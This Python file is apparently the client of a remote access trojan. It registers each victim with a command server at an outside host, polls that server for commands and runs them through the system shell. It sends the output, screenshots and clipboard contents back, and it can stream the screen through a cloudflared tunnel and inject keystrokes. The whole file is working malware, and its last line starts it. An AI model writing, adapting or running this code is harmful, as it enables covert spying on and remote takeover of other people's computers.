from netpwner import NetworkPwner
from server import app
from mss import mss
from stream import *
import subprocess
import socket
import webbrowser
import threading
import pyperclip
import os
os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
import pygame
import pyautogui
import requests
import platform
import time
import sys
import re
import io

class VolumeController:
    def __init__(self):
        self.system = platform.system()

        if self.system == "Windows":
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

            self.devices = AudioUtilities.GetSpeakers()
            self.interface = self.devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            self.volume_control = cast(self.interface, POINTER(IAudioEndpointVolume))

        elif self.system in ["Linux", "Darwin"]:  # macOS/Linux
            import pulsectl
            self.pulse = pulsectl.Pulse('volume-controller')

    def get_volume(self) -> int:
        """Returns the current volume percentage (0-100)."""
        if self.system == "Windows":
            return int(self.volume_control.GetMasterVolumeLevelScalar() * 100)
        elif self.system in ["Linux", "Darwin"]:
            default_sink = self.pulse.sink_list()[0]  # Get the default audio output device
            return int(default_sink.volume.value_flat * 100)
        return None

    def set_volume(self, volume):
        volume = int(volume)
        """Sets the system volume to the given percentage (0-100)."""
        volume = max(0, min(volume, 100))  # Ensure volume stays within range

        if self.system == "Windows":
            self.volume_control.SetMasterVolumeLevelScalar(volume / 100, None)
        elif self.system in ["Linux", "Darwin"]:
            default_sink = self.pulse.sink_list()[0]
            self.pulse.volume_set_all_chans(default_sink, volume / 100)

class Exploit:
    def __init__(self):
        self.url = "https://meterpreter.pythonanywhere.com/"
        self.os_name = self.get_os_name()
        self.pattern = r"\s+",
        self.target = re.sub(r"\s+", "", subprocess.run('whoami',shell=True,capture_output=True,text=True).stdout)
        self.ip = socket.gethostbyname(socket.gethostname())
        self.T = True
        self.mixer = pygame.mixer
        self.tunnel_process = None
        self.vc = VolumeController()
        self.register()

    def launch_cloudflared_tunnel(self,port):
 
        command = [
            "cloudflared", "tunnel",
            "--url", f"http://{self.ip}:{port}"
        ]


        self.tunnel_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        url_printed = False
        while True:
            output = self.tunnel_process.stderr.readline()
            if output == '' and self.tunnel_process.poll() is not None:
                break
            if output:
                # Use regex to extract the tunnel URL (ignoring developer links)
                match = re.search(r'https://[a-zA-Z0-9.-]+\.trycloudflare\.com', output)
                if match and not url_printed:
                    url_printed = True
                    print("tunnel started")
                    return match.group(0)
            
            time.sleep(1)

    def start_local_server(self):
        def run_server():
            app.run(host='0.0.0.0',port=8000)
        
        self.server_thread = threading.Thread(target=run_server)
        self.server_thread.start()
    

    def stop_tunnel(self):
        if self.tunnel_process:
            print("Stopping the tunnel...")
            self.tunnel_process.terminate()  
            self.tunnel_process.wait() 
            return "Tunnel stopped."
        else:
            return "No tunnel is running."

    def get_os_name(self) -> str:
        os_name = platform.system()+platform.release()
        return os_name

    def stop_screen_share(self) -> str:
        self.T = False
        return f"stream stopped on {self.target}"

    def share_screen(self):
        self.T = True
        self.start_local_server()
        with mss() as sct:
            monitor = sct.monitors[1]
            while self.T:
                try:
                    stream_screen(sct,monitor,f'http://0.0.0.0:8000/upload_stream/',self.target,0.06)
                except Exception as e:
                    requests.post(f'{self.url}/api/log/',json={
                        'target': self.target,
                        'log': e,
                        'command': "stream error",
                    })
                    return
    
    def hundle_command(self, command):
        if command.startswith("cd"):
            try:
                path = command[3:].strip()
                os.chdir(path)
                exc = os.getcwd()
            except Exception as e:
                exc=f"process faild, error : {e}"
        elif command == "pwn networks" :
            if sys.platform in ["win32", "win64"]:
                NetworkPwner.expose_data()
            else:
                exc = f"Sorry , Unsupported platform : {sys.platform}"
        elif command in  ["screenshot","scsh","screen shot"]:
            self.screenshot()
            exc = None
        elif command.startswith('write'):
            pyautogui.write(self.clean_message("write",command))
            exc = "message typed successfuly !!!"
        elif command.startswith('browser'):
            webbrowser.open(self.clean_message("browser",command))
            exc = "the browser will open in any minute!!!"
        elif command.startswith('$play'):
            try:
                self.play_sound(command)
                exc = "The sound will start playing"
            except Exception as e:
                exc = f"The sound can't be played due error : {e}"
        elif command == '$stop':
            exc = "The sound will stop playing"
            self.stop_sound()
        elif command == '$copyed':
            exc = 'result : '+pyperclip.paste()
        elif command.startswith('$excute'):
            os.system(self.clean_message("$excute", command))
        elif command in ["screenshare","stream"]:
            url = self.launch_cloudflared_tunnel(8000)
            t1 = threading.Thread(target=self.share_screen)
            t1.start()
            exc =f"stream started by {self.target} at {url}/stream/{self.target}/"

        elif command in ['stop screenshare',"stop stream"]:
            exc = self.stop_screen_share()
        elif command == '$volume':
            vl = self.vc.get_volume()
            exc =f"the volume : {vl}"

        elif command.startswith('$volume '):
            vl = self.clean_message("$volume",command)
            cvl = self.vc.get_volume()
            if not vl.isnumeric():
                return f"{vl} : is not a number"
            if len(vl) > 3 or len(vl) == 0:
                return f"{vl} : is not a number between 0 and 100"
            self.vc.set_volume(vl)
            exc =f"the volume changed from {cvl} --> {self.vc.get_volume()}"
        else: 
            exc = subprocess.run(command, shell=True,capture_output=True,text=True).stdout
        return exc
    
    def reverce_http(self):
        commands = requests.get(f'{self.url}/api/commands/?target={self.target}').json()
        requests.delete(f'{self.url}/api/commands/?target={self.target}')
        if type(commands) == list:
            for cm in commands:
                command = cm["command"]
                try:
                    exc = self.hundle_command(command)
                except Exception as e:
                    exc = f'Command could not be excuted due erro : {e}'
                
                if exc:
                    requests.post(f'{self.url}/api/log/',json={
                        'target': self.target,
                        'log': exc,
                        'command': command,
                    })
            
    
    def register(self):
        requests.post(f'{self.url}/api/states/',json={"target":self.target,"state":"Connected","os":self.os_name})
        requests.post(f'{self.url}/api/victime/', json={
            "name" : self.target,
            "os" : self.os_name,
            "ip" : self.ip,
            "created" : time.time(),
        })
    
    def screenshot(self):
        screenshot = pyautogui.screenshot()
        screenshot.save(".upls/screenshot.png")
        url = f"{self.url}/api/uploads"
        files = {"file": open(".upls/screenshot.png", "rb")}
        response = requests.post(url,json={"target":self.target},files=files)
        os.remove(".upls/screenshot.png")
        if response.status_code == 200:
            return "Screenshot uploaded successfully!"
        else:
            return "Upload failed:", response.status_code, response.text
        
    def clean_up(self):
        requests.delete(f'{self.url}/api/victime/?name={self.target}')
        requests.post(f'{self.url}/api/states/',json={"target":self.target,"state":"Disconnected"})

    def clean_message(self,keyword,word) -> str:
        word = word.split(keyword,1)[1][1:]
        return word

    def main(self):
        try:
            while True:
                self.reverce_http()
                time.sleep(1)
        except KeyboardInterrupt:
            self.clean_up()

    def play_sound(self,song):
        song = self.clean_message("$play",song)
        response = requests.get(song)
        mp3_stream = io.BytesIO(response.content)
        self.mixer.init()
        self.mixer.music.load(mp3_stream)
        self.mixer.music.play()

    def stop_sound(self):
        self.mixer.music.stop()

Exploit().main()
